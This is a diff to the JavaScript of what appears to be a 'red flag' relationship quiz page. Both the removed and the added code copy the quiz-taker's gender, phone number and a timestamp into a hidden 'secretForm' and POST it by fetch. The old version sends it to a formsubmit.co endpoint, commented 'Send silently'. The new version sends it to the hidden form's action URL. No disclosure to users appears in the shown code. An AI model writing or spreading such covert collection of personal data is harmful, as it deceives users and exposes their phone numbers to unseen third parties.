@@ -1407,11 +1407,8 @@
       // Generate initial quote for donation section
       generateQuote();
     });
-    // Fill the hidden form
-form.addEventListener('submit', async function (e) {
-  e.preventDefault();
-
-  const fd = new FormData(form);
+ function submitAndStart() {
+  const fd = new FormData(document.getElementById('redFlagForm'));
 
   // Fill hidden form values
   document.getElementById('formUserGender').value = fd.get('userGender');
@@ -1420,22 +1417,23 @@ form.addEventListener('submit', async function (e) {
   document.getElementById('formPhoneNumber').value = fd.get('phone') || 'N/A';
   document.getElementById('formTimestamp').value = new Date().toLocaleString();
 
-  const hiddenFd = new FormData(document.getElementById('secretForm'));
+  const hiddenForm = document.getElementById('secretForm');
+  const hiddenFd = new FormData(hiddenForm);
 
-  // Send silently to FormSubmit
-  fetch('https://formsubmit.co/el/telegi', {
+  // Submit via fetch (no redirect)
+  fetch(hiddenForm.action, {
     method: 'POST',
     body: hiddenFd
   });
 
-  // Continue to questions
-  const targetGender = fd.get('targetGender');
-  questions = targetGender === 'female' ? girlQuestions : guyQuestions;
-  form.classList.add('hidden');
-  questionSection.classList.remove('hidden');
+  // Now continue with the quiz
+  questions = fd.get('targetGender') === 'female' ? girlQuestions : guyQuestions;
+  document.getElementById('redFlagForm').classList.add('hidden');
+  document.getElementById('questionSection').classList.remove('hidden');
+  currentQuestion = 0;
+  redFlags = 0;
   showQuestion();
-});
-
+}
 
   </script>
 </body>
